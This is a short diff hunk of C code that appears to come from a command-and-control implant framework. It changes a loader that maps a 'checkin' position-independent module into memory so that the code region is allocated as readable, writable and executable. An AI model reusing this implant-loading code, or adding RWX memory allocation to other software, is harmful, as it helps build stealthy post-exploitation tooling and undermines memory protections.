@@ -23,7 +23,7 @@ void load_picos(AgentCapabilities *cap) {
 	funcs.VirtualFree = (__typeof__(VirtualFree) *) KERNEL32$VirtualFree;
 	
 	src_pico = find_checkin_pico();
-	cap->CheckinPicoCode = KERNEL32$VirtualAlloc(NULL, PicoCodeSize(src_pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
+	cap->CheckinPicoCode = KERNEL32$VirtualAlloc(NULL, PicoCodeSize(src_pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_EXECUTE_READWRITE);
 	cap->CheckinPicoData = KERNEL32$VirtualAlloc(NULL, PicoDataSize(src_pico), MEM_RESERVE|MEM_COMMIT|MEM_TOP_DOWN, PAGE_READWRITE);
 	PicoLoad((IMPORTFUNCS *) &funcs, src_pico, cap->CheckinPicoCode, cap->CheckinPicoData);
 	cap->CheckinPicoEntrypoint = (CHECKIN_PICO) PicoEntryPoint(src_pico, cap->CheckinPicoCode);
